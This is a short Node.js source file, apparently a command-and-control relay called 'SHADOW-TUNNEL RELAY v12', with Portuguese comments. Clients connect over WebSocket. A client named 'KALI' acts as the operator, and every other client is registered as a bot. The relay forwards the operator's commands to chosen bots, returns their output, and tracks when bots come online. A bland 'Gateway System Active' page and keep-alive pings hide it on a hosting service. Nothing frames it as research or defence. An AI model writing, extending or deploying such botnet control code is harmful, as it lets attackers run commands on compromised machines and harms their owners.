// ---------- SHADOW-TUNNEL RELAY v12 ---------- //
const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((_, res) => {
    res.writeHead(200);
    res.end('Gateway System Active');
});

const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

function rawSend(ws, data) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(data);
    }
}

wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const id = urlParams.get('id');

    if (!id) return ws.close(1008, 'ID Requerido');

    if (id === 'KALI') {
        if (KALI) KALI.close(); 
        KALI = ws;
        console.log('[+] Operador KALI conectado.');
        // Sincroniza bots já online
        BOTS.forEach((_, botId) => {
            rawSend(KALI, JSON.stringify({ t: 'bot', s: 'on', id: botId }));
        });
    } else {
        BOTS.set(id, ws);
        console.log(`[!] Bot conectado: ${id}`);
        if (KALI) rawSend(KALI, JSON.stringify({ t: 'bot', s: 'on', id: id }));
    }

    ws.on('message', (raw) => {
        try {
            if (ws === KALI) {
                const d = JSON.parse(raw);
                const target = BOTS.get(d.to);
                if (target) rawSend(target, d.cmd);
            } else {
                // Encaminha resposta do Bot para o Kali
                if (KALI) {
                    KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
                }
            }
        } catch (e) {
            console.log("Erro no relay de mensagens");
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
            console.log('[-] Operador desligado.');
        } else {
            BOTS.delete(id);
            if (KALI) rawSend(KALI, JSON.stringify({ t: 'bot', s: 'off', id: id }));
        }
    });

    // Anti-Idle para o Render não derrubar a conexão
    const heartbeat = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(heartbeat);
        }
    }, 25000);
});

server.listen(process.env.PORT || 10000);
